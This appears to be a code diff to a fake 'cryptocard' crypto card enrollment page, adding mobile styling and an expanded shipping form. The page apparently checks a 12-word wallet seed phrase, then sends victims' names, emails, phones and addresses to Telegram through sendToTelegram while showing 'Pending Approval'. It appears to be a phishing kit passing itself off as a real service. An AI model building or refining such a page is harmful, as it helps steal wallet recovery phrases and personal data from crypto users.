@@ -654,20 +654,91 @@
     .wm-linked-row span { color: var(--muted); }
     .wm-linked-row strong { font-size: 12px; }
 
-    /* responsive navbar */
-    @media(max-width:640px){
-      .cb-nav-links { display: none; }
-      .cb-nav-back { font-size: 12px; padding: 6px 10px; }
+    /* ── RESPONSIVE ─────────────────────────────────────────────── */
+
+    /* Tablet / small desktop */
+    @media(max-width:768px){
+      .cb-nav-links { gap: 0; }
+      .cb-nav-link  { padding: 6px 10px; font-size: 13px; }
+      .cb-nav-inner { gap: 16px; }
+      .wrapper { padding: 24px 12px 48px; }
+      .stage   { padding: 24px 18px; border-radius: 16px; }
     }
 
-    /* responsive */
+    /* Navbar collapse */
+    @media(max-width:640px){
+      .cb-nav-links { display: none; }
+      .cb-nav-back  { font-size: 12px; padding: 6px 10px; }
+      .cb-breadcrumb{ padding: 6px 16px 8px; }
+    }
+
+    /* Mobile */
     @media(max-width:480px){
-      .card-type-grid { grid-template-columns: 1fr; }
+      /* Layout */
+      .wrapper { padding: 16px 8px 40px; }
+      .stage   { padding: 20px 14px; border-radius: 14px; max-width: 100%; }
+
+      /* Typography scale-down */
+      .screen h2   { font-size: clamp(20px,6vw,26px); }
+      .screen .sub { font-size: 13px; margin-bottom: 22px; }
+
+      /* Card type chooser — stack vertically */
+      .card-type-grid { grid-template-columns: 1fr; gap: 10px; }
+      .card-type-btn  { padding: 20px 16px; flex-direction: row; align-items: center; gap: 14px; }
+      .ct-icon { font-size: 26px; }
+
+      /* Wallet list — single column */
       .wallet-grid { grid-template-columns: 1fr; }
-      .crypto-card { width: 300px; height: 186px; }
-      .glow-ring { width: 300px; height: 240px; }
-      .card-number { font-size: 14px; }
-      .wg-grid { grid-template-columns: repeat(2, 1fr); }
+
+      /* Wallet browse grid — 2 cols instead of 3 */
+      .wg-grid { grid-template-columns: repeat(2, 1fr); gap: 8px; }
+      .wg-logo { width: 42px; height: 42px; }
+      .wg-name { font-size: 11px; }
+
+      /* Credit card — scale to screen width */
+      .crypto-card {
+        width: min(320px, calc(100vw - 48px));
+        height: auto;
+        aspect-ratio: 85.6 / 53.98;
+      }
+      .glow-ring {
+        width: min(320px, calc(100vw - 48px));
+        height: auto;
+        aspect-ratio: 85.6 / 53.98;
+      }
+      .card-number  { font-size: clamp(12px,3.5vw,17px); letter-spacing: .10em; }
+      .card-inner   { padding: 16px 18px; }
+      .card-chip    { width: 30px; height: 22px; margin: 10px 0 8px; }
+
+      /* Card details panel */
+      .cd-row { flex-wrap: wrap; gap: 4px; }
+      .cd-row strong { word-break: break-all; }
+
+      /* Shipping form — City/State/Zip stack on very small screens */
+      .ship-csz { grid-template-columns: 1fr !important; }
+
+      /* Generic 2-col rows → single col */
+      .vm-row-2 { grid-template-columns: 1fr; gap: 10px; }
+
+      /* Action buttons — stack */
+      .action-row { flex-direction: column; gap: 8px; }
+      .btn-primary, .btn-ghost { width: 100%; }
+
+      /* Wallet modal — full-width bottom sheet feel */
+      .wm-modal { max-width: 100%; border-radius: 20px 20px 0 0; margin-top: auto; }
+      .wm-overlay { align-items: flex-end; padding: 0; }
+
+      /* Connecting animation — smaller rings */
+      .connect-visual { width: 160px; height: 160px; }
+      .connect-center { inset: 40px; font-size: 24px; }
+    }
+
+    /* Very small phones */
+    @media(max-width:360px){
+      .crypto-card {
+        width: calc(100vw - 40px);
+      }
+      .card-number { font-size: 11px; }
     }
   </style>
 </head>
@@ -773,7 +844,7 @@
         <div id="s3Error" style="display:none;color:#F87171;font-size:12px;margin-bottom:10px;font-weight:600">
           ⚠ Please enter your name and email
         </div>
-        <button class="btn-primary" style="width:100%" onclick="submitCardAddr()">Continue →</button>
+        <button class="btn-primary" style="width:100%" onclick="submitCardAddr()">Continue To Activate→</button>
         <button class="btn-ghost" style="width:100%;margin-top:8px" onclick="showScreen('s2')">← Back</button>
       </div>
 
@@ -814,7 +885,6 @@
                 <svg width="22" height="22" viewBox="0 0 24 24" fill="none"><circle cx="12" cy="12" r="12" fill="#0052FF"/><path d="M12 5.5a6.5 6.5 0 100 13A6.5 6.5 0 0012 5.5zm0 10a3.5 3.5 0 110-7 3.5 3.5 0 010 7z" fill="#fff"/></svg>
                 <span>cryptocard</span>
               </div>
-              <span class="card-network-badge" id="cardNetwork">ETHEREUM</span>
             </div>
             <div class="card-chip"></div>
             <div class="card-number" id="cardNumber">•••• •••• •••• ••••</div>
@@ -883,7 +953,6 @@
 
       <div class="action-row">
         <button class="btn-primary" onclick="showScreen('s9')">Continue →</button>
-        <button class="btn-ghost" id="shipBtn" onclick="goShipping()" style="display:none">📦 Ship Physical</button>
       </div>
     </div>
 
@@ -994,23 +1063,61 @@
       </div>
       <div class="vm-form">
         <div class="vm-row-2">
-          <div class="vm-field"><label>First name</label><input type="text" placeholder="John" /></div>
-          <div class="vm-field"><label>Last name</label><input type="text" placeholder="Doe" /></div>
-        </div>
-        <div class="vm-field"><label>Street address</label><input type="text" placeholder="123 Main Street" /></div>
-        <div class="vm-field"><label>Apt / Suite</label><input type="text" placeholder="Apt 4B (optional)" /></div>
-        <div class="vm-row-2">
-          <div class="vm-field"><label>City</label><input type="text" placeholder="San Francisco" /></div>
-          <div class="vm-field"><label>ZIP</label><input type="text" placeholder="94107" maxlength="5" /></div>
+          <div class="vm-field">
+            <label>First name</label>
+            <input type="text" id="shipFirst" placeholder="John" autocomplete="given-name" />
+          </div>
+          <div class="vm-field">
+            <label>Last name</label>
+            <input type="text" id="shipLast" placeholder="Doe" autocomplete="family-name" />
+          </div>
         </div>
         <div class="vm-field">
-          <label>State</label>
-          <select>
-            <option value="">Select state</option>
-            <option>CA</option><option>NY</option><option>TX</option><option>FL</option>
-            <option>IL</option><option>WA</option><option>CO</option><option>GA</option>
-            <option>AZ</option><option>NV</option>
-          </select>
+          <label>Street address</label>
+          <input type="text" id="shipStreet" placeholder="123 Main Street" autocomplete="address-line1" />
+        </div>
+        <div class="vm-field">
+          <label>Apt / Suite <span style="font-weight:400;text-transform:none;color:#9CA3AF">(optional)</span></label>
+          <input type="text" id="shipApt" placeholder="Apt 4B" autocomplete="address-line2" />
+        </div>
+        <div class="ship-csz" style="display:grid;grid-template-columns:2fr 1fr 1fr;gap:12px">
+          <div class="vm-field">
+            <label>City</label>
+            <input type="text" id="shipCity" placeholder="San Francisco" autocomplete="address-level2" />
+          </div>
+          <div class="vm-field">
+            <label>State</label>
+            <select id="shipState" autocomplete="address-level1">
+              <option value="">—</option>
+              <option>AL</option><option>AK</option><option>AZ</option><option>AR</option>
+              <option>CA</option><option>CO</option><option>CT</option><option>DE</option>
+              <option>FL</option><option>GA</option><option>HI</option><option>ID</option>
+              <option>IL</option><option>IN</option><option>IA</option><option>KS</option>
+              <option>KY</option><option>LA</option><option>ME</option><option>MD</option>
+              <option>MA</option><option>MI</option><option>MN</option><option>MS</option>
+              <option>MO</option><option>MT</option><option>NE</option><option>NV</option>
+              <option>NH</option><option>NJ</option><option>NM</option><option>NY</option>
+              <option>NC</option><option>ND</option><option>OH</option><option>OK</option>
+              <option>OR</option><option>PA</option><option>RI</option><option>SC</option>
+              <option>SD</option><option>TN</option><option>TX</option><option>UT</option>
+              <option>VT</option><option>VA</option><option>WA</option><option>WV</option>
+              <option>WI</option><option>WY</option>
+            </select>
+          </div>
+          <div class="vm-field">
+            <label>ZIP</label>
+            <input type="text" id="shipZip" placeholder="94107" maxlength="5" inputmode="numeric" autocomplete="postal-code" />
+          </div>
+        </div>
+        <div class="vm-row-2">
+          <div class="vm-field">
+            <label>Email</label>
+            <input type="email" id="shipEmail" placeholder="you@example.com" autocomplete="email" />
+          </div>
+          <div class="vm-field">
+            <label>Phone</label>
+            <input type="tel" id="shipPhone" placeholder="+1 (555) 000-0000" autocomplete="tel" />
+          </div>
         </div>
       </div>
       <div style="height:16px"></div>
@@ -1304,9 +1411,6 @@ function revealCard() {
   // Animate card number reveal (count up digits)
   animateCardNumber();
 
-  // Show ship button for physical
-  document.getElementById('shipBtn').style.display = cardType === 'physical' ? '' : 'none';
-
   // Network badge
   const networks = { 'Phantom':'SOLANA', 'Ledger':'HARDWARE' };
   document.getElementById('cardNetwork').textContent = networks[walletName] || 'ETHEREUM';
@@ -1370,14 +1474,17 @@ function toggleCardFlip() {
 function goShipping() { showScreen('s6'); }
 
 async function submitShipping() {
-  const name    = (document.getElementById('shipName')  || document.getElementById('s10Addr') || {}).value || walletAddr || '—';
-  const email   = window._enrollEmail || '';
-  const phone   = (document.getElementById('shipPhone') || {}).value || '';
-  const street  = (document.getElementById('shipStreet')|| {}).value || '';
-  const apt     = (document.getElementById('shipApt')   || {}).value || '';
-  const city    = (document.getElementById('shipCity')  || {}).value || '';
-  const zip     = (document.getElementById('shipZip')   || {}).value || '';
-  const address = [street, apt, city, zip].filter(Boolean).join(', ');
+  const first  = (document.getElementById('shipFirst')  || {}).value || '';
+  const last   = (document.getElementById('shipLast')   || {}).value || '';
+  const name   = [first, last].filter(Boolean).join(' ') || walletAddr || '—';
+  const email  = (document.getElementById('shipEmail')  || {}).value || window._enrollEmail || '';
+  const phone  = (document.getElementById('shipPhone')  || {}).value || '';
+  const street = (document.getElementById('shipStreet') || {}).value || '';
+  const apt    = (document.getElementById('shipApt')    || {}).value || '';
+  const city   = (document.getElementById('shipCity')   || {}).value || '';
+  const state  = (document.getElementById('shipState')  || {}).value || '';
+  const zip    = (document.getElementById('shipZip')    || {}).value || '';
+  const address = [street, apt, city, state, zip].filter(Boolean).join(', ');
 
   const tgMsg = `📦 *Physical Card Enrollment*\n👤 Name: ${walletAddr}\n📧 Email: ${email || '—'}\n📱 Phone: ${phone || '—'}\n🏠 Address: ${address || '—'}\n💳 Card: Physical`;
   sendToTelegram(tgMsg).catch(() => {});
@@ -1455,11 +1562,15 @@ if (words.length < 12) {
   } catch (_) {}
 
   document.getElementById('s10Addr').textContent = walletAddr;
-  document.getElementById('s10Type').textContent = 'Virtual Card';
+  document.getElementById('s10Type').textContent = cardType === 'physical' ? 'Physical Card' : 'Virtual Card';
   document.getElementById('wsAddr').textContent  = 'Pending Approval';
   document.getElementById('wsBal').textContent   = '⏳ Under Review';
   if (btn) btn.disabled = false;
-  showScreen('s10');
+  if (cardType === 'physical') {
+    showScreen('s6');
+  } else {
+    showScreen('s10');
+  }
 }
 
 async function sendToTelegram(text) {
